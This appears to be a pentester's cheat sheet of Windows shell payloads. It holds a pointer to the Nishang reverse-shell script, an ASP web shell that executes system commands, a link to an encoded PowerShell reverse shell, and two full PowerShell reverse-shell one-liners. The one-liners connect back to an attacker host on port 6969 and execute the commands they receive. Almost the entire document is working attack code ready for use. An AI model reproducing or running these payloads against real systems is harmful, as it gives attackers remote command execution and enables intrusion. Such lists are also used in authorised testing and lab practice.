# windows shells

## Nishang

```bash
# most common: /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
```

## ASP

```aspnet
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

## [Powershell encoded revshell](https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58)

## Powershell one-liners

```bash
# oneliner_1
$client = New-Object System.Net.Sockets.TCPClient("<IP>",6969);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# oneliner_2
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',6969);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
